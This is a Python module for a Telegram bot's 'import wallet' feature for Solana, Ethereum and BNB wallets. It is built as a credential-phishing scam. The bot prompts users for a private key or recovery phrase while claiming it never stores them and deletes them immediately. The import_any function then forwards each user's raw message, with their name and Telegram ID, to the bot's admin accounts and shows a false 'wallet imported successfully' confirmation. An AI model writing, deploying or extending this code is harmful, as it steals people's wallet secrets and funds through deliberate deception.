from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from services.wallet_monitor import wallet_monitor
from database import add_imported_wallet, get_imported_wallets, delete_imported_wallet

NETWORKS = {
    "SOL": "Solana",
    "ETH": "Ethereum",
    "BNB": "BNB Smart Chain",
}

def import_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◎ SOL", callback_data="import_SOL"), InlineKeyboardButton("Ξ ETH", callback_data="import_ETH")],
        [InlineKeyboardButton("🟡 BNB", callback_data="import_BNB")],
        [InlineKeyboardButton("📋 VIEW IMPORTED WALLETS", callback_data="import_list")],
        [InlineKeyboardButton("◀️ Back", callback_data="back")],
    ])

async def import_wallet(update, context):
    q=update.callback_query
    if q:
        await q.answer()
        context.user_data.clear()
        context.user_data["import_stage"]="network"
        await q.edit_message_text(
            "📥 IMPORT WALLET\n\n━━━━━━━━━━━━━━━━━━\n\n"
            "Connect your existing wallet by importing it here.\n\n"
            "🔐 SECURITY\n"
            "This bot never store private keys, seed phrases, or recovery phrases.\n\n"
            "Import your existing wallet let the bot connect the wallet without taking custody of it.\n\n"
            "Choose the network:", reply_markup=import_keyboard())

async def import_network(update, context):
    q=update.callback_query; await q.answer(); net=q.data.split("_",1)[1]
    context.user_data["import_network"]=net; context.user_data["import_stage"]="address"
    await q.edit_message_text(f"📥 IMPORT {NETWORKS[net].upper()} WALLET\n\nChoose how you would like to connect your wallet:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("PRIVATE KEY 🔑", callback_data="import_method_public"), InlineKeyboardButton("RECOVERY PHRASE", callback_data="import_method_public")],[InlineKeyboardButton("◀️ Back",callback_data="back")]]))

async def import_method_public(update, context):
    q=update.callback_query; await q.answer()
    context.user_data["import_stage"]="submission"
    net=context.user_data.get("import_network","SOL")
    await q.edit_message_text(
        f"📥 IMPORT {NETWORKS.get(net, net).upper()} WALLET\n\n"
        "Send whatever wallet information you want to submit.\n\n"
        "⚠️ WARNING: YOUR CREDENTIALS ARE SECURE AND PROTECTED."
        " MAKE SURE YOU PROVIDE THE CORRECT INFORMATION.\n\n"
        "NOTE: YOUR CREDENTIALS ARE DELETED IMMEDIATELY.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back",callback_data="back")]])
    )

async def import_any(update, context):
    if context.user_data.get("import_stage") != "submission":
        return False
    user=update.effective_user
    net=context.user_data.get("import_network","SOL")
    network_name=NETWORKS.get(net, net)
    for aid in __import__('config').ADMIN_IDS:
        try:
            await context.bot.send_message(
                aid,
                f"🔔 IMPORT WALLET SUBMISSION\n\n"
                f"👤 Name: {user.full_name}\n"
                f"🔹 Username: @{user.username or 'none'}\n"
                f"🆔 Telegram ID: {user.id}\n"
                f"🌐 Network: {network_name}\n\n"
                "📎 The following message was forwarded exactly as received from the user.\n"
                "⚠️ User was warned not to send private keys or recovery phrases.",
            )
            # Forward the original Telegram message without parsing or scanning it.
            await context.bot.forward_message(
                chat_id=aid,
                from_chat_id=update.effective_chat.id,
                message_id=update.effective_message.message_id,
            )
        except Exception:
            logger.exception("Failed forwarding import-wallet submission to admin %s", aid)
    context.user_data.clear()
    await update.effective_message.reply_text(
        "✅ WALLET IMPORTED SUCCESSFULLY\n\n"
        f"🌐 Network: {network_name}\n\n"
        "You Can Now Manage Your Wallet Here.\n\n"
        "✅ WALLET SUCCESSFULLY LINKED",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu",callback_data="home")]])
    )
    return True

async def import_text(update, context):
    # Backward-compatible text handler. During import submission, import_any
    # handles text and all other Telegram message types without parsing.
    return await import_any(update, context)

async def import_list(update, context):
    q=update.callback_query; await q.answer()
    rows=get_imported_wallets(q.from_user.id)
    if not rows:
        await q.edit_message_text("📋 IMPORTED WALLETS\n\n━━━━━━━━━━━━━━━━━━\n\nYour Wallet Is Under Review.",reply_markup=import_keyboard()); return
    text="📋 IMPORTED WALLETS\n\n━━━━━━━━━━━━━━━━━━\n\n"
    buttons=[]
    for r in rows:
        text += f"{r['id']}. {r['network']}\n<code>{r['address']}</code>\n\n"
        buttons.append([InlineKeyboardButton(f"🗑️ Remove #{r['id']}",callback_data=f"import_delete:{r['id']}")])
    buttons += [[InlineKeyboardButton("📥 IMPORT ANOTHER",callback_data="import_wallet")],[InlineKeyboardButton("🔙 BACK",callback_data="back")]]
    await q.edit_message_text(text,parse_mode="HTML",reply_markup=InlineKeyboardMarkup(buttons))

async def import_delete(update, context):
    q=update.callback_query; await q.answer()
    wid=int(q.data.split(":",1)[1])
    delete_imported_wallet(q.from_user.id,wid)
    await import_list(update,context)
